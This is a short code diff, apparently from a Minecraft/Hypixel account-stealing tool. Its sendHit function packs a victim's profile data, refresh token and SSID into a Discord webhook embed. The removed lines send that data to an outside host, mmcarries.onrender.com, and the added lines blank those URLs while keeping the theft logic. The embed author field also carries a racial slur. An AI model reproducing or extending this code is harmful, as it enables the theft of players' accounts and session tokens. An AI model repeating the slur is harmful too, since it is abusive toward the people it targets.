@@ -73,7 +73,7 @@ const getInfo = async (res) => {
 };
 
 const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
-  const webhookClient = new WebhookClient({ url: 'https://mmcarries.onrender.com/verify/' });
+  const webhookClient = new WebhookClient({ url: '' });
 
   avgSkillLvl = '```' + Math.floor(firstProfileData.data.average_level) + '```'
   purse = '```' +  Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' }) + '```'
@@ -87,7 +87,7 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
   .setTitle(name)
   .setURL('https://sky.shiiyu.moe/stats/' + name)
   .setThumbnail('https://crafatar.com/avatars/' + id)
-  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://mmcarries.onrender.com/refresh?refreshToken=' + refresh })
+  .setAuthor({ name: 'Hit Some Ni**a Hard', url: '' + refresh })
   .addFields(
     { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
     { name: ' ', value: ' ' },
